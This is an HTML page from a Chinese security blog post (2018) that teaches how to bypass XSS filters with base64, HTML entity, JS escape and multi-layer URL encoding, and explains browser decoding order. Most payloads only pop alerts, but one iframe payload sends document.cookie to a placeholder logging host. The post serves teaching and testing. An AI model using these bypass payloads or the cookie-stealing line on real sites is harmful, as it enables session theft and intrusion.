@@ -1,0 +1,1221 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="th3wind">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="th3wind">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="纯净水@流云-自留地">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>编码绕过xss · fi3ework&#39;s Studio</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >fi3ework&#39;s Studio.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">编码绕过xss</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>fi3ework's Studio.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            编码绕过xss
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "XSS">XSS</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Web渗透">Web渗透</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "常规渗透">常规渗透</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">3.3k</span>阅读时长: <span class="post-count reading-time">14 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/12/02</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h4 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h4><p>img、video、audio、iframe中的src属性只能请求，不能执行，在ie8以前可以;但可以使用js伪协议调用js</p>
+<pre><code>&lt;iframe src=&quot;javascript:alert(&#39;iframe&#39;)&quot; width = &quot;0&quot; height = &quot;0&quot;/&gt;
+
+&lt;iframe src=&quot;javascript:var img=document.createElement(&#39;img&#39;);
+img.src=&#39;http://xx.xxx.xxx.xxx/log&#39;+escape(document.cookie);
+document.body.appendChild(img);&quot;/&gt;
+</code></pre><h4 id="Base64编码绕过"><a href="#Base64编码绕过" class="headerlink" title="Base64编码绕过"></a>Base64编码绕过</h4><p>一般应用场景：</p>
+<pre><code>&lt;a href=&quot;可控点&quot;&gt;
+&lt;iframe src=&quot;可控点&quot;&gt;
+</code></pre><p>当在这种情况下 过滤了&lt;&gt;’ “ javascript的话 就可以尝试使用base64编码绕过</p>
+<pre><code>&lt;a href=&quot;data:text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&quot;&gt;test&lt;/a&gt;
+
+&lt;img src=x onerror=alert(1)&gt;
+</code></pre><p>这样当test A链接时,就会以data协议 页面以html/text的方式解析 编码为base64 然后单点击a链接时 base64的编码就被还原成原本的</p>
+<h4 id="HTML编码16进制-10进制-amp-x-amp"><a href="#HTML编码16进制-10进制-amp-x-amp" class="headerlink" title="HTML编码16进制/10进制 &amp;#x/&amp;"></a>HTML编码16进制/10进制 &amp;#x/&amp;</h4><p>html实体编码本身只是为了防止与html本身语义标记的冲突。html正常只识别html10进制、html16进制,不会在html标签中解析js的那些编码，因此在比如onerror后放置js的编码比如jsunicode、js八进制、js16进制是不会解析的。</p>
+<pre><code>&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;
+</code></pre><h4 id="magic-quote-gpc绕过"><a href="#magic-quote-gpc绕过" class="headerlink" title="magic_quote_gpc绕过"></a>magic_quote_gpc绕过</h4><p>在遇到php中magic_quote_gpc（版本5.4之后已经移除了） 魔术变量处理开关转义，即便存储到后台的数据也会是转义的，如果输入的数据有<br>单引号（’）、双引号（”）、反斜线（）与 NUL（NULL 字符）等字符都会被加上反斜线。针对该设置，进行xss绕过的话，通常使用js的string.fromCharCode()</p>
+<pre><code>&lt;?php
+$a=$_GET[&#39;id&#39;];
+echo $a;
+?&gt;
+
+http://localhost:8888/ev_php/xss_gpc.php?id=%3Cscript%3Ealert(String.fromCharCode(34,%2049,%2034))%3C/script%3E
+
+&lt;script&gt;alert(String.fromCharCode(34, 49, 34))&lt;/script&gt;
+</code></pre><p>string.fromCharCode()： Unicode 字符值中返回一个字符串</p>
+<h4 id="javascript-jsunicode-8进制和16进制"><a href="#javascript-jsunicode-8进制和16进制" class="headerlink" title="javascript jsunicode 8进制和16进制"></a>javascript jsunicode 8进制和16进制</h4><p>[&lt;] 分别是 \u003c \74 \x3c</p>
+<h4 id="宽字节绕过"><a href="#宽字节绕过" class="headerlink" title="宽字节绕过"></a>宽字节绕过</h4><h4 id="头部Base绕过"><a href="#头部Base绕过" class="headerlink" title="头部Base绕过"></a>头部Base绕过</h4><h4 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h4><p>【1】浏览器在发出url前会进行一次url编码，针对部分字符，以firefox为例子：</p>
+<pre><code>发出的请求    &#39;&quot; &lt;script&gt;alert(1)&lt;/script&gt; 
+服务端接收到的请求  %27%22%20%3Cscript%3Ealert(1)%3C/script%3E
+
+服务端自动解码一次返回数据（默认） 
+&#39;&quot; &lt;script&gt;alert(1)&lt;/script&gt; 
+
+</code></pre><p>这也是为什么提交payload的时候可以不编码、urlencode<br>注意 浏览器的urlencode 应该是不包括%的，和常规的urlencode不太一样</p>
+<ul>
+<li>双重编码<br>在某些时候测试xss中，可能会遇到payload中被htmlspecialcahrs编码，但可以针对服务端进行双重编码绕过，推测该后端代码<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+在该url中经过htmlspecialchars处理后，又再次进行了urldecode，相当于进行了两次urldecode，又因为经过编码绕过了htmlspecialchars的处理，故触发了该xss</li>
+<li>三重编码<br>和双重绕过类似，推测多出来的一次是因为在htmlspecialchars前又进行了一次编码，如果没有后面那一行”echo urldecode($a);” 过滤是正常的，两者问题都出在此处<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$a1</span><span class="token operator">=</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+</li>
+</ul>
+<h3 id="浏览器编码解码原理"><a href="#浏览器编码解码原理" class="headerlink" title="浏览器编码解码原理"></a>浏览器编码解码原理</h3><p>为了更深入的了解xss的结果和原理，不得不了解浏览器的工作原理，以及解码顺序。<br>浏览器中具有URL解析引擎、HTML解析引擎、JS解析引擎<br>主要构成：</p>
+<ul>
+<li>用户界面</li>
+<li>浏览器引擎－ 用来查询及操作渲染引擎的接口</li>
+<li>渲染引擎－ 用来显示请求的内容，例如，如果请求内容为html，它负责解析html及css，并将解析后的结果显示出来</li>
+<li>网络－ 用来完成网络调用，例如http请求，它具有平台无关的接口，可以在不同平台上工作</li>
+<li>UI 后端－ 用来绘制类似组合选择框及对话框等基本组件，具有不特定于某个平台的通用接口，底层使用操作系统的用户接口</li>
+<li>JS解释器－ 用来解释执行JS代码</li>
+<li>数据存储－ 属于持久层，浏览器需要在硬盘中保存类似cookie的各种数据，HTML5定义了web database技术，这是一种轻量级完整的客户端存储技术</li>
+</ul>
+<h4 id="重点是接下来的编码解码顺序"><a href="#重点是接下来的编码解码顺序" class="headerlink" title="重点是接下来的编码解码顺序"></a>重点是接下来的编码解码顺序</h4><p>首先是URL解析:</p>
+<ul>
+<li>用户在浏览器中填写一个资源定位标识，浏览器在将内容发送给对应的服务器，服务器对浏览器发过来的请求信息进行URL解析，在这个过程中遇到%号时会对该url进行url解码，该解码位置在于服务端自动解码一次，不需要编写代码，浏览器自身是不会进行url解码的<br>案例：</li>
+</ul>
+<ol>
+<li>在客户端提交一次经过urlencode的字符串，在接收到服务端的返回数据时，已经经过urldecode了，而服务端如果直接返回urlencode的数据，浏览器接收到仍然用urlencode的形式渲染，在xss中并不会起作用,测试代码如下，有点乱 小尴尬：<pre><code>&lt;?php
+echo $a1=$_GET[&#39;id&#39;];
+echo &quot;1&lt;/br&gt;&quot;;
+echo $a2 =&quot;%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e&quot;;
+?&gt;
+</code></pre>在测试中a2的xss仍然以urlencode的形式返回到浏览器而不会解析，而以get方式提交的id，以urlencode形式提交则会解析触发xss</li>
+</ol>
+<ul>
+<li>HTMl/SVG/XHTML 解析<br>浏览器在接收到页面数据时，会首先对该数据进行HTML解析来构造DOM树，构造的过程与语言的编译过程是相似的，接收文档，先进行词法分析，然后语法分析，构建解析树。HTML 的分析器只能识别特定的词法规则，才能构建起DOM 树，<strong>这一块，HTML 不会做解码的工作</strong><br>因此以下代码无效：即标签本身结构不能变化<pre><code>&lt;img src&amp;#x3d;&quot;http://xxx.xxx.xx.xxx&quot;&gt;
+</code></pre>在DOM构建完成后，才开始识别节点内容<br>对html实体编码的内容进行解码<h5 id="构造DOM树"><a href="#构造DOM树" class="headerlink" title="构造DOM树"></a>构造DOM树</h5>解析树是由DOM元素和属性节点构成的树结构，根节点是Document对象，DOM与标记一一对应<pre><code>&lt;html&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;utf-8&quot;&gt;
+  &lt;title&gt;
+  &lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;p&gt;&lt;/p&gt;
+&lt;h1&gt;&lt;/h1&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>对应的DOM树：<pre><code>graph TD
+st(HTMLDocument)--&gt;a
+a(HTML)
+a--&gt;b1(head)
+a--&gt;b2(body)
+b1--&gt;c1(meta)
+b1--&gt;c2(title)
+b2--&gt;p1(p)
+b2--&gt;p2(h)
+</code></pre>解析过程是迭代的，解析器从词法分析器处取到一个新的符号，并试着用这个符号匹配一条语法规则，如果匹配了一条规则，这个符号对应的节点将被添加到解析树上，然后解析器请求另一个符号。如果没有匹配到规则，解析器将在内部保存该符号，并从词法分析器取下一个符号，直到所有内部保存的符号能够匹配一项语法规则。如果最终没有找到匹配的规则，解析器将抛出一个异常，这意味着文档无效或是包含语法错误。</li>
+</ul>
+<pre><code>如：&lt;img11 src=1 onerror=&#39;a(1)&#39;&gt;
+在浏览器解析时会报错：
+HTML 文档的字符编码未声明。如果该文件包含 US-ASCII 范围之外的字符，该文件将在某些浏览器配置中呈现为乱码。页面的字符编码必须在文档或传输协议层声明。  untitled.html
+</code></pre><p>而最后输出的树，也就是这里的解析树，是由DOM元素及属性节点组成的<br>DOM树构建完毕后</p>
+<p>html编码就会被解析，html解析中无法用常规的自下而上或自上而下的解析器进行解析<br>原因在于：<br>    语言的宽容本质<br>    浏览器历来对一些常见的无效html用法采取包容态度<br>    解析过程需要不断地重复，源内容在解析过程中通常不会改变，但是在 HTML 中，脚本标记如果包含 document.write，就会添加额外的标记，这样解析过程实际上就更改了输入内容，浏览器创建了自定义的解释器来解析HTML</p>
+<ul>
+<li>html解释器算法</li>
+</ul>
+<p>标记化和树构建<br>标记化是词法分析过程、将输入内容解析成多个标记<br>构建解析流程图如下：</p>
+<pre><code>graph TD
+st[network]--&gt;a1
+a1[tokeniser]--&gt;a2
+a2{tree construction}--&gt;a3[DOM]
+a2{tree construction}--&gt;a4[ScriptExecution]
+a4[ScriptExecution]--&gt;a1
+a3--&gt;a4
+</code></pre><p>标记生成器识别标记，传递给树构造器，然后接受下一个字符以识别下一个标记；如此反复直到输入的结束</p>
+<h5 id="js解释器"><a href="#js解释器" class="headerlink" title="js解释器"></a>js解释器</h5><p>在处理如<br>“script、style”这样的标签，解释器会切换到特殊解析模式，在src href 后边加入的JavaScript 等的html解码后，进入js的解析模式，进入该模式后，该DOM节点已经建立起了。</p>
+<p>所以先进行jsunincode编码再进行html编码可以正常触发</p>
+<pre><code>&lt;a href=&quot;javascript:alert&amp;#40;&amp;#39;&amp;#60;&amp;#92;&amp;#117;&amp;#52;&amp;#101;&amp;#48;&amp;#48;&amp;#62;&amp;#39;&amp;#41;&quot;&gt;test&lt;/a&gt;
+</code></pre><p>在测试中 先进行html实体编码，再进行js16进制转码，不会正常解码</p>
+<pre><code>源码:&lt;a href=&quot;javascript:alert(&#39;test&#39;)&quot;&gt;test&lt;/a&gt;
+</code></pre><p>测试输出为unicode编码：</p>
+<pre><code>先html:
+&lt;a href=&quot;javascript:alert(&#39;&amp;#116;&amp;#101;&amp;#115;&amp;#116;&#39;)&quot;&gt;test&lt;/a&gt;
+再js16进制：
+&lt;a href=&quot;javascript:alert(&#39;\x26\x23\x31\x31\x36\x3b\x26\x23\x31\x30\x31\x3b\x26\x23\x31\x31\x35\x3b\x26\x23\x31\x31\x36;&#39;)&quot;&gt;test&lt;/a&gt;
+
+</code></pre><p>正常输出：test</p>
+<pre><code>&lt;a href=&quot;javascript:alert(&#39;&amp;#92;&amp;#120;&amp;#55;&amp;#52;&amp;#92;&amp;#120;&amp;#54;&amp;#53;&amp;#92;&amp;#120;&amp;#55;&amp;#51;&amp;#92;&amp;#120;&amp;#55;&amp;#52;&#39;)&quot;&gt;test&lt;/a&gt;
+</code></pre><pre><code>先js 16进制:
+&lt;a href=&quot;javascript:alert(&#39;\x74\x65\x73\x74&#39;)&quot;&gt;test&lt;/a&gt;
+再html编码：
+&lt;a href=&quot;javascript:alert(&#39;&amp;#92;&amp;#120;&amp;#55;&amp;#52;&amp;#92;&amp;#120;&amp;#54;&amp;#53;&amp;#92;&amp;#120;&amp;#55;&amp;#51;&amp;#92;&amp;#120;&amp;#55;&amp;#52;&#39;)&quot;&gt;test&lt;/a&gt;
+</code></pre><p>先进行html编码再进行unicode编码 解析失败</p>
+<pre><code>&lt;a href=&quot;javascript:\u0026\u0023\u0039\u0037\u003b\u0026\u0023\u0031\u0030\u0038\u003b\u0026\u0023\u0031\u0030\u0031\u003b\u0026\u0023\u0031\u0031\u0034\u003b\u0026\u0023\u0031\u0031\u0036\u003b(&#39;1111&#39;)&quot;&gt;test&lt;/a&gt;
+</code></pre><p>先进行unicode编码再进行html编码解析成功</p>
+<pre><code>&lt;a href=&quot;javascript:&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#49;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#99;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#53;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#50;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#52;(&#39;1111&#39;)&quot;&gt;test&lt;/a&gt;
+</code></pre><p>综上 浏览器对于编码解码的顺序 url解码-html解码-js解码</p>
+<p>tips:经测试 js16进制/8进制只会在js 字符串中解析，如果作为变量名、触发事件则不会解析如：</p>
+<p>思考：&lt;&lt;白帽子讲Web安全&gt;&gt;</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;script&gt;
+    var x2=\x61\x6c\x65rt(1);
+    var x1=&quot; &#39;onclick=alert(1);//&#39;&quot;
+    var x=&quot;\x20\x27onclick\x3dalert\x281\x29\x3b\x2f\x2f\27&quot;;
+    document.write(&quot;&lt;a href=&#39;&quot;+x1+&quot;&#39;&gt;test&lt;a&gt;&quot;);
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+</code></pre><p>可以用以下例子来尝试看一下弹窗顺序</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;img src=1 onerror=&#39;a(1)&#39;&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+    a(2);
+&lt;/script&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+    function a(c){
+        alert(c);
+    }
+&lt;/script&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+    a(3);
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>参考 0x_Jin 凯神的<a href="http://su.xmd5.org/static/drops/tips-689.html" target="_blank" rel="noopener">《XSS与字符编码那些事儿》</a></p>
+<h4 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h4><h5 id="xss中禁用了-amp-符号"><a href="#xss中禁用了-amp-符号" class="headerlink" title="xss中禁用了&amp;#符号"></a>xss中禁用了&amp;#符号</h5><p>实体编码是由&amp;#组成的，这个时候只能考虑能不能通过url编码绕过&amp;#，再让浏览器解码成 &amp;# 然后拼接x27 最后就成为了单引号的html16进制编码来绕过<br>借用凯神的案例 </p>
+<pre><code>&lt;a href=&quot;javascript:location=&#39;./3.3.php?offset=&#39;+document.getElementById(&#39;pagenum&#39;).value+&#39;&amp;searchtype_yjbg=yjjg&amp;searchvalue_yjbg=&#39;&quot;&gt;GO&lt;/a&gt;
+</code></pre><p>提交的payload：</p>
+<pre><code>wooyun%26%23x27,alert(1)%2b%26%23x27
+</code></pre><p>解码后</p>
+<pre><code>&#39;,alert(1)&#39;
+</code></pre><p>感谢在@星尘的指导下，从新捋了捋xss编码的问题，现阶段就暂时到这吧。还是沉淀不够。革命尚未成功，同志尚需努力啊 by @流云</p>
+<h4 id="在线工具"><a href="#在线工具" class="headerlink" title="在线工具"></a>在线工具</h4><p>在线编码解码工具：<br><a href="https://www.mokuge.com/tool/unicode/" target="_blank" rel="noopener">https://www.mokuge.com/tool/unicode/</a></p>
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul>
+<li><a href="https://www.cesafe.com/5075.html" target="_blank" rel="noopener">https://www.cesafe.com/5075.html</a></li>
+<li><a href="http://su.xmd5.org/static/drops/tips-689.html" target="_blank" rel="noopener">http://su.xmd5.org/static/drops/tips-689.html</a></li>
+</ul>
+<p>宽字节：</p>
+<ul>
+<li><a href="http://book.2cto.com/201301/14515.html" target="_blank" rel="noopener">http://book.2cto.com/201301/14515.html</a> </li>
+<li><a href="http://itindex.net/detail/47408-xss-%E5%AD%A6%E4%B9%A0-xss" target="_blank" rel="noopener">http://itindex.net/detail/47408-xss-%E5%AD%A6%E4%B9%A0-xss</a> </li>
+<li><a href="http://www.wooyun.org/bugs/wooyun-2010-015969" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2010-015969</a></li>
+<li><a href="https://blog.csdn.net/u013648937/article/details/46629827" target="_blank" rel="noopener">https://blog.csdn.net/u013648937/article/details/46629827</a> </li>
+</ul>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://yoursite.com">th3wind</a>
+            <p>原文链接：<a href="http://yoursite.com/2018/12/02/xss/编码绕过XSS/">http://yoursite.com/2018/12/02/xss/编码绕过XSS/</a>
+            <p>发表日期：<a href="http://yoursite.com/2018/12/02/xss/编码绕过XSS/">December 2nd 2018, 12:00:00 am</a>
